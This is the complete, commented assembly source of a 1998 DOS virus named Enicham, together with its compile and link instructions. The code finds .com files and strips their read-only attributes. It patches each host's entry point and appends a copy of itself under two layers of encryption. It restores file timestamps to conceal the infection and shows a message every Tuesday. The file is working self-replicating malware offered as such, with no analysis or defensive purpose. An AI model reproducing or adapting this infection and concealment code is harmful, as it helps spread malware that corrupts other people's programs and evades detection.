; ------------------------------------------------------------------------- ;
;         Enicham v1.3 coded by KilJaeden of the Codebreakers 1998          ;
; ------------------------------------------------------------------------- ;
; Description: `-------------------| Started: 17/06/98 | Finished: 18/06/98 ;
;                                  `-------------------^------------------- ;
; v1.0 - runtime .com appender with one layer of encryption     | Size: 543 ;
; v1.1 - restores time/date & attributes + infects readonly     `---------- ;
; v1.2 - add second layer of XOR,NEG,NOT,ROR,ROL encryption                 ;
; v1.3 - add small payload, show our presence every tuesday                 ;   
; ------------------------------------------------------------------------- ;
; ---------------------> This Is For Christine Moore <--------------------- ;
; ------------------------------------------------------------------------- ;
; to compile ::] tasm enicham.asm                                           ;
; to link :::::] tlink /t enicham.obj                                       ;
; ------------------------------------------------------------------------- ;

code    segment                                 ; name our segment 'code'
        assume  cs:code,ds:code                 ; assign CS and DS to code
        org     100h                            ; this be a .com file
        jumps                                   ; save space jumping

blank:  db      0e9h,0,0                        ; jump to start of code
start:  call    delta                           ; push IP on to stack
delta:  pop     bp                              ; pop it into BP
        sub     bp,offset delta                 ; get the delta offset

decr:   jmp     once                            ; jump to once (overwritten)
        lea     si,[bp+encd]                    ; start of encrypted stuff
        mov     di,si                           ; move si into di
        call    encr                            ; call our decryption loop

; -------------------( Start Of 1st Encryption Blanket )------------------- ;
; ------------------------------------------------------------------------- ;

encd:   lea     si,[bp+d_encd]                  ; start address of layer 2
        mov     di,si                           ; move it into DI
        mov     cx,d_encr-d_encd                ; # of bytes to decrypt
        call    d_encr                          ; second layer decrypted

; -------------------( Start Of 2nd Encryption Blanket )------------------- ;
; ------------------------------------------------------------------------- ;

d_encd: lea     si,[bp+thrbyte]                 ; what bytes to restore
        mov     di,100h                         ; where to restore them
        push    di                              ; push 100h on to stack
        movsw                                   ; move two bytes
        movsb                                   ; move one byte

        lea     dx,[bp+offset dta]              ; where to put the DTA
        mov     ah,1ah                          ; move the DTA
        int     21h                             ; it's moved now

        mov     ah,4eh                          ; find first file
        lea     dx,[bp+comfile]                 ; with extension .com
        mov     cx,7                            ; possible attributes

find:   int     21h                             ; find the file
        jc      exit                            ; no files found, exit

        lea     dx,[bp+offset dta+1eh]          ; get the file info
        mov     ax,4300h                        ; get file attributes
        int     21h                             ; get them now
        push    cx                              ; push the attributes
        push    dx                              ; push the file name

        mov     ax,4301h                        ; set file attributes
        xor     cx,cx                           ; to none at all
        int     21h                             ; set them now

        mov     ax,3d02h                        ; open the file
        int     21h                             ; it is open now
        xchg    bx,ax                           ; move the info

        mov     ax,5700h                        ; get time / date
        int     21h                             ; we have them now
        push    dx                              ; push the date
        push    cx                              ; push the time

        mov     ah,3fh                          ; read from file
        lea     dx,[bp+thrbyte]                 ; read into here
        mov     cx,3                            ; read three bytes
        int     21h                             ; got the first three

        mov     ax,word ptr [bp+dta+1ah]        ; get file size
        mov     cx,word ptr [bp+thrbyte+1]      ; move thrbyte+1 into CX
        add     cx,finished-start+3             ; get virus + jump size
        cmp     ax,cx                           ; compare the two
        jz      close                           ; if equal, close file
        cmp     ax,1000                         ; file is > then 1kb ?
        jb      close                           ; to small, close it
        cmp     ax,62000                        ; file is < then 62kb ?
        ja      close                           ; to big, close it up

        sub     ax,3                            ; get size of main jump
        mov     word ptr [bp+newjump+1],ax      ; write it into newjump

        mov     ax,4200h                        ; scan to start of file
        xor     cx,cx                           ; xor value of cx to 0
        cwd                                     ; likewize for dx
        int     21h                             ; pointing to SOF

        mov     ah,40h                          ; write to file
        lea     dx,[bp+newjump]                 ; write the jump
        mov     cx,3                            ; # of bytes to write
        int     21h                             ; write them now

        mov     ax,4202h                        ; scan to end of file
        xor     cx,cx                           ; xor value of cx to 0
        cwd                                     ; likewize for dx
        int     21h                             ; pointing to EOF

        lea     si,[bp+start]                   ; load the source index
        lea     di,[bp+buffer]                  ; load the desination index
        mov     cx,finished-start               ; # of bytes to move
        rep     movsb                           ; load it into memory

        lea     si,[bp+d_encd-start+buffer]     ; load the source index
        mov     cx,d_encr-d_encd                ; # of bytes to encrypt
        mov     di,si                           ; move SI into DI
        call    d_encr                          ; encrypt 1st layer

        lea     di,[bp+encd-start+buffer]       ; load the desination index
        mov     si,di                           ; move it into SI
        mov     cx,encr-encd                    ; # of bytes to encrypt
        call    encr                            ; encrypt 2nd layer

        mov     ah,40h                          ; write to file
        mov     cx,finished-start               ; # of bytes to write
        lea     dx,[bp+buffer]                  ; start of virus in mem
        int     21h                             ; write it now

close:  mov     ax,5701h                        ; set time / date
        pop     cx                              ; pop the time
        pop     dx                              ; pop the date
        int     21h                             ; restore time/date files

        mov     ax,4301h                        ; set attributes
        pop     dx                              ; for this file
        pop     cx                              ; with these attributes
        int     21h                             ; restore them now

        mov     ah,3eh                          ; close the file
        int     21h                             ; file is closed

        mov     ah,4fh                          ; find next file
        jmp     find                            ; find it now

exit:   mov     ah,2ah                          ; get system time
        int     21h                             ; we have it now
        cmp     al,004h                         ; is it tuesday?
        jne     endit                           ; nope, end this

        mov     ah,09h                          ; print a message
        lea     dx,[bp+pldmsg]                  ; our payload message
        int     21h                             ; print it now
        mov     ah,00h                          ; wait for keypress
        int     16h                             ; anounce our presence

endit:  mov     ah,1ah                          ; set DTA location
        mov     dx,80h                          ; to this location
        int     21h                             ; restore DTA
        retn                                    ; return control to host

; ----------------------------( The Data Area )---------------------------- ;
; ------------------------------------------------------------------------- ;

        pldmsg  db '',10,13
                db '  Infected with :: Enihcam :: written by KilJaeden of the Codebreakers 1998',10,13,'$'
        thrbyte db 0cdh,20h,0                   ; terminates 1st gen
        newjump db 0e9h,0,0                     ; blank jump 1st gen
        comfile db "*.com",0                    ; extension to search for
        dta     db 43 dup (?)                   ; space for DTA

; --------------------( End Of 2nd Encryption Blanket )-------------------- ;
; ------------------------------------------------------------------------- ;

d_encr: lodsb                                   ; load a byte
        xor     al,0C4h                         ;------[1] 
        neg     al                              ;-----[2]
        ror     al,4                            ;----[3]
        not     al                              ;---[4]
        rol     al,4                            ;--[5]
        neg     al                              ;-[6] encryption/decryption
        rol     al,4                            ;--[5]
        not     al                              ;---[4]
        ror     al,4                            ;----[3]
        neg     al                              ;-----[2]
        xor     al,0C4h                         ;------[1]
        stosb                                   ; store the byte
        loop    encr                            ; do all the bytes
        ret                                     ; return from call

; --------------------( End Of 1st Encryption Blanket )-------------------- ;
; ------------------------------------------------------------------------- ;

encr:   lodsb                                   ; load a byte
        neg     al                              ;------[1]
        ror     al,4                            ;-----[2] 
        not     al                              ;----[3] 
        neg     al                              ;---[4] 
        rol     al,4                            ;--[5] 
        xor     al,0C4h                         ;-[6] encryption/decryption
        rol     al,4                            ;--[5]
        neg     al                              ;---[4]
        not     al                              ;----[3]
        ror     al,4                            ;-----[2]
        neg     al                              ;------[1]
        stosb                                   ; store the byte
        loop    encr                            ; do all the bytes
        ret                                     ; return from call

; ------------------------------------------------------------------------- ;
; ------------------------------------------------------------------------- ;
 
        buffer:                                 ; save our virus in mem
        finished:                               ; offset label for virus end

once:   lea     si,[bp+new]                     ; load source index
        lea     di,[bp+decr]                    ; load destination index
        movsw                                   ; move two bytes
        movsb                                   ; move one byte
        jmp     d_encd                          ; jump to encrypted area
new:    mov     cx,encr-encd                    ; this replaces the jump

        code    ends                            ; end code segment
        end     blank                           ; end / where to start

; ------------------------------------------------------------------------- ;
; ---------> How Can You Think Freely In The Shadow Of A Church? <--------- ;
; ------------------------------------------------------------------------- ;
